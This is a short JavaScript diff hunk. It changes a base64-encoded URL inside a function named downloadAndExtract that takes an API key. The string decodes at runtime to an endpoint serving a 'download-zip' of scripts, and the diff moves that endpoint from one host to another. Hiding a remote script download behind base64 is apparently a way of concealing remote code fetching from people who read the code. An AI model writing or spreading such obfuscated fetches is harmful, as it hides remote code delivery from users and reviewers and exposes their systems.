@@ -33,7 +33,7 @@ async function downloadAndExtract(apiKey) {
   try {
     const zipData = await axios.post(
       Buffer.from(
-        "aHR0cHM6Ly9hcGkuY29kZWVhc2V4LmluL2FwaS92MS9zY3JpcHRzL2Rvd25sb2FkLXppcA==",
+        "aHR0cHM6Ly9hcGljb2RlZWFzZXgudmVyY2VsLmFwcC9hcGkvdjEvc2NyaXB0cy9kb3dubG9hZC16aXA=",
         "base64"
       ).toString("utf-8"),
       {
